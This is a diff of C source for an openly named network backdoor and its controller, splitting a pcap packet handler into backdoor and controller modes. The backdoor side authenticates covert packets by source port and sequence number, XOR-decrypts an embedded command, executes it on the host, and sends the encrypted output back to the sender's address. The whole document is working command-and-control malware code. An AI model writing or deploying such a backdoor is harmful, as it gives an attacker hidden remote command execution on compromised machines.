@@ -64,19 +64,13 @@ char **execute_command(const char *command, int *size)
 void got_packet(u_char *args, const struct pcap_pkthdr *header,
                 const u_char *packet)
 {
-    char command[MAX_COMMAND_LEN];
+    Mode mode = *(Mode*)args;
     char decrypted[MAX_COMMAND_LEN];
 
-    char **command_output_ptr;
-    char *command_output;
-    char *encrypted_command_output;
-
-    int command_output_size;
     int tcp_sport;
     unsigned int tcp_seqnum;
 
     char *payload;
-    char *end_ptr;
 
     const struct sniff_ip *ip;
     const struct sniff_tcp *tcp;
@@ -86,7 +80,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     int size_payload = 0;
 
     // clear buffers
-    memset(command, 0, MAX_COMMAND_LEN);
     memset(decrypted, 0, MAX_COMMAND_LEN);
 
     // calculate lengths
@@ -106,7 +99,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
-        printf("Inauthentic packet:\n Source port: %u\n, Seqnum: %u\n", tcp_sport, tcp_seqnum);
+        // printf("Inauthentic packet:\n Source port: %u\n, Seqnum: %u\n", tcp_sport, tcp_seqnum);
         return;
     }
     printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n",
@@ -117,23 +110,48 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
               size_payload);
     printf("Decrypted payload: %s\n", decrypted);
 
+    if (mode == BACKDOOR)
+    {
+        backdoor_mode(decrypted, ip->ip_src);
+    }
+    else if (mode == CONTROLLER)
+    {
+        controller_mode(decrypted);
+    }
+    else
+    {
+        return;
+    }
+
+    return;
+}
+
+void backdoor_mode(const char *decrypted, const struct in_addr address)
+{
+    char **command_output_ptr;
+    char *command_output;
+    char *encrypted_command_output;
+
+    char *command;
+    char *end_ptr;
+
+    int command_output_size;
+
     // Step 4: Verify decrypted payload has a command in it
-    if (!(payload = strstr(decrypted, COMMAND_START)))
+    if (!(command = strstr(decrypted, COMMAND_START)))
     {
         printf("Could not find command start\n");
         return;
     }
-    payload += strlen(COMMAND_START);
+    command = command + strlen(COMMAND_START);
     if (!(end_ptr = strstr(decrypted, COMMAND_END)))
     {
-        printf("Could not find command start\n");
+        printf("Could not find command end\n");
         return;
     }
+    *end_ptr = 0;
 
-    // Step 5: Extract the command
-    strncpy(command, payload, end_ptr - payload);
-
-    // Step 6: Execute the command
+    // Step 5: Execute the command
     command_output_ptr = execute_command(command, &command_output_size);
     printf("Command executed:\n%s\n", command);
 
@@ -152,16 +170,19 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     }
     printf("Command output: \n%s\n", command_output);
 
-    // Step 7: Send the results back
+    // Step 6: Send the results back
     encrypted_command_output = malloc(total_size);
     xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output,
               encrypted_command_output, total_size);
-    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output,
+    send_message_to_ip(address, SERVER_PORT, encrypted_command_output,
                        total_size);
 
     free(encrypted_command_output);
     // free command_output which was malloced by
     free(command_output);
+}
 
-    return;
+void controller_mode(const char *decrypted)
+{
+    printf("Received response:\n%s\n", decrypted);
 }
